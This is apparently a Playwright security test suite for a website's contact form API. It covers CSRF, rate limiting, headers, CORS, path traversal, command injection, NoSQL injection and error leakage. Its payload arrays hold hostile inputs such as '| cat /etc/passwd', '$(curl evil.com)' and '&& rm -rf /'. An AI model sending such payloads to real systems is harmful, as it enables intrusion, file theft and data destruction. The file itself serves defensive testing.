import { test, expect } from '@playwright/test';
import { testData, expectedResponses, selectors, waitTimes } from './helpers/test-data';
import { NetworkInterceptor } from './helpers/network-interceptor';

test.describe('Contact Form - Security & Rate Limiting', () => {
  let interceptor: NetworkInterceptor;

  test.beforeEach(async ({ page }) => {
    interceptor = new NetworkInterceptor(page);
    await interceptor.startRecording();
    await page.goto('/contact');
    await page.waitForLoadState('networkidle');
  });

  test.afterEach(() => {
    interceptor.stopRecording();
  });

  test('should enforce CSRF protection', async ({ page, context }) => {
    // Try to submit without CSRF token
    const response = await page.request.post('/api/contact', {
      data: testData.validContact,
      headers: {
        'Content-Type': 'application/json',
        // Deliberately omit X-CSRF-Token header
      },
    });

    // Should be rejected (403) or handle gracefully (400)
    expect([400, 403].includes(response.status())).toBe(true);
    
    try {
      const responseData = await response.json();
      if (response.status() === 403) {
        expect(responseData.error || responseData.message).toMatch(/security|token|csrf/i);
      }
    } catch (error) {
      // Response might not be JSON - check text response
      const responseText = await response.text();
      if (response.status() === 403) {
        expect(responseText).toMatch(/security|token|csrf|forbidden/i);
      }
    }
  });

  test('should fetch and use CSRF token correctly', async ({ page }) => {
    // Load the page which should fetch CSRF token
    await page.goto('/contact');
    await page.waitForLoadState('networkidle');

    // Verify CSRF token was fetched
    const csrfCalls = interceptor.getCSRFCalls();
    expect(csrfCalls.length).toBeGreaterThan(0);
    
    const csrfCall = csrfCalls[0];
    expect(csrfCall.status).toBe(200);
    expect(csrfCall.responseBody?.token).toBeTruthy();

    // Fill and submit form
    await page.fill(selectors.form.firstName, 'CSRF');
    await page.fill(selectors.form.lastName, 'Test');
    await page.fill(selectors.form.email, 'csrf@test.com');
    await page.fill(selectors.form.message, 'Testing CSRF protection');

    // Submit form which should include CSRF token
    const responsePromise = page.waitForResponse(response => 
      response.url().includes('/api/contact')
    );

    await page.click(selectors.form.submitButton);
    const response = await responsePromise;

    // Should succeed with valid CSRF token
    expect(response.status()).toBe(200);

    // Verify CSRF token was sent in headers
    const apiCalls = interceptor.getAPICalls('/api/contact');
    const submitCall = apiCalls.find(call => call.method === 'POST');
    expect(submitCall).toBeDefined();
  });

  test('should enforce rate limiting', async ({ page }) => {
    // Submit form multiple times quickly
    const submissions = [];
    
    for (let i = 0; i < 7; i++) {
      const formData = {
        firstName: `Test${i}`,
        lastName: 'User',
        email: `test${i}@example.com`,
        message: `Test message ${i}`,
      };

      submissions.push(
        page.request.post('/api/contact', {
          data: formData,
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': 'test-token', // Would need real token in practice
          },
        })
      );
    }

    const responses = await Promise.all(submissions);
    const statusCodes = responses.map(r => r.status());

    // Should have some 429 (Too Many Requests) responses
    const rateLimitedCount = statusCodes.filter(status => status === 429).length;
    expect(rateLimitedCount).toBeGreaterThan(0);

    // First few should succeed
    const successCount = statusCodes.filter(status => status === 200).length;
    expect(successCount).toBeGreaterThan(0);
    expect(successCount).toBeLessThanOrEqual(5); // Rate limit is 5 per minute
  });

  test('should include security headers in responses', async ({ page }) => {
    const response = await page.goto('/contact');
    
    if (response) {
      const headers = response.headers();
      
      // Check security headers
      expect(headers['x-frame-options']).toBe('DENY');
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-xss-protection']).toBe('1; mode=block');
      expect(['strict-origin-when-cross-origin', 'origin-when-cross-origin'])
        .toContain(headers['referrer-policy']);
      
      // Check for HTTPS enforcement headers in production
      if (process.env.NODE_ENV === 'production') {
        expect(headers['strict-transport-security']).toContain('max-age=');
      }
    }
  });

  test('should validate API endpoint CORS configuration', async ({ page }) => {
    // Make cross-origin request
    const response = await page.request.get('/api/contact', {
      headers: {
        'Origin': 'https://evil-site.com',
      },
    });

    const headers = response.headers();
    
    // Should not allow arbitrary origins in production
    if (process.env.NODE_ENV === 'production') {
      expect(headers['access-control-allow-origin']).not.toBe('*');
      expect(headers['access-control-allow-origin']).not.toBe('https://evil-site.com');
    }
  });

  test('should handle path traversal attempts', async ({ page }) => {
    const pathTraversalPayloads = [
      '../../etc/passwd',
      '../../../windows/system32/config/sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ];

    for (const payload of pathTraversalPayloads) {
      const response = await page.request.post('/api/contact', {
        data: {
          ...testData.validContact,
          company: payload,
          message: payload,
        },
        headers: {
          'Content-Type': 'application/json',
        },
      });

      // Should either sanitize or reject, but not cause server error
      expect([200, 400, 403].includes(response.status())).toBe(true);
      
      // Should not expose sensitive information
      const responseText = await response.text();
      expect(responseText).not.toContain('root:');
      expect(responseText).not.toContain('/etc/');
      expect(responseText).not.toContain('\\windows\\');
    }
  });

  test('should prevent command injection', async ({ page }) => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(curl evil.com)',
      '&& rm -rf /',
    ];

    for (const payload of commandInjectionPayloads) {
      const response = await page.request.post('/api/contact', {
        data: {
          ...testData.validContact,
          firstName: payload,
          message: payload,
        },
        headers: {
          'Content-Type': 'application/json',
        },
      });

      // Should handle safely
      expect([200, 400].includes(response.status())).toBe(true);
      
      // Check no command was executed
      const responseData = await response.json();
      expect(JSON.stringify(responseData)).not.toContain('total');
      expect(JSON.stringify(responseData)).not.toContain('drwx');
      expect(JSON.stringify(responseData)).not.toContain('root');
    }
  });

  test('should handle NoSQL injection attempts', async ({ page }) => {
    const noSqlPayloads = [
      { $ne: null },
      { $gt: '' },
      { $regex: '.*' },
      { email: { $ne: 'test' } },
    ];

    for (const payload of noSqlPayloads) {
      const response = await page.request.post('/api/contact', {
        data: {
          ...testData.validContact,
          email: payload,
        },
        headers: {
          'Content-Type': 'application/json',
        },
      });

      // Should reject invalid data structures
      expect([400, 403].includes(response.status())).toBe(true);
    }
  });

  test('should validate Content-Type header', async ({ page }) => {
    // Try with wrong Content-Type
    const response = await page.request.post('/api/contact', {
      data: testData.validContact,
      headers: {
        'Content-Type': 'text/plain',
      },
    });

    // Should reject or handle appropriately
    expect([400, 415].includes(response.status())).toBe(true);
  });

  test('should handle large payload attacks', async ({ page }) => {
    const largePayload = {
      ...testData.validContact,
      message: 'A'.repeat(1000000), // 1MB of data
    };

    const response = await page.request.post('/api/contact', {
      data: largePayload,
      headers: {
        'Content-Type': 'application/json',
      },
    });

    // Should reject oversized payloads
    expect([400, 413].includes(response.status())).toBe(true);
  });

  test('should not expose sensitive information in errors', async ({ page }) => {
    // Trigger various errors
    const errorTriggers = [
      { data: null },
      { data: 'not json' },
      { data: { malformed: true } },
      { data: { email: null } },
    ];

    for (const trigger of errorTriggers) {
      const response = await page.request.post('/api/contact', trigger);
      const responseText = await response.text();

      // Should not expose:
      // - Stack traces
      expect(responseText).not.toContain('at ');
      expect(responseText).not.toContain('Error:');
      
      // - File paths
      expect(responseText).not.toContain('/src/');
      expect(responseText).not.toContain('/app/');
      expect(responseText).not.toContain('/node_modules/');
      
      // - Database information
      expect(responseText).not.toContain('SELECT');
      expect(responseText).not.toContain('INSERT');
      expect(responseText).not.toContain('database');
      
      // - Environment variables
      expect(responseText).not.toContain('RESEND_API_KEY');
      expect(responseText).not.toContain('process.env');
    }
  });

  test('should implement proper session timeout', async ({ page, context }) => {
    // Submit a successful form
    await page.fill(selectors.form.firstName, 'Session');
    await page.fill(selectors.form.lastName, 'Test');
    await page.fill(selectors.form.email, 'session@test.com');
    await page.fill(selectors.form.message, 'Testing session management');

    await page.click(selectors.form.submitButton);
    await page.waitForSelector(selectors.form.successMessage);

    // Wait for potential session timeout (shortened for testing)
    await page.waitForTimeout(2000);

    // Try to submit again - should require new CSRF token
    await page.reload();
    await page.fill(selectors.form.firstName, 'Session2');
    await page.fill(selectors.form.lastName, 'Test2');
    await page.fill(selectors.form.email, 'session2@test.com');
    await page.fill(selectors.form.message, 'Testing session management again');

    const responsePromise = page.waitForResponse(response => 
      response.url().includes('/api/contact')
    );

    await page.click(selectors.form.submitButton);
    const response = await responsePromise;

    // Should work with new token
    expect(response.status()).toBe(200);
  });
});